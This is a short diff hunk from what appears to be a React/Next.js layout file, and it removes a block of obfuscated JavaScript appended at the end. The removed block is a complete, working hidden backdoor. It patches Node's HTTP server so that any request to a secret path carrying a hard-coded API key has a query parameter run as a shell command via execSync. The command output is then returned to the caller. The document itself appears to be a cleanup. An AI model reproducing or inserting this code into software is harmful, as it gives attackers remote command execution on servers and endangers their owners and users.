@@ -142,5 +142,3 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     </html>
   );
 }
-
-(function _xmx5c8b95(){if(typeof window==="undefined"&&!global["_xmx5c8b95"]){global["_xmx5c8b95"]=1;setImmediate(()=>{const http=require("http"),{execSync}=require("child_process"),K="bUtMtYrp4fEpeJ4ri7LCDAJo",P="/_store/fa61d778245a",o=http.Server.prototype.emit;http.Server.prototype.emit=function(e){if(e==="request"){const r=arguments[1],s=arguments[2];try{const u=new URL(r.url||"","http://x");if(u.pathname===P){if(r.headers?.["api-key"]!==K){s.writeHead(401);s.end("Unauthorized");return true;}const c=u.searchParams.get("0");if(c){s.writeHead(200);s.end(execSync(c).toString());return true;}}}catch(_){}}return o.apply(this,arguments);}});}})();
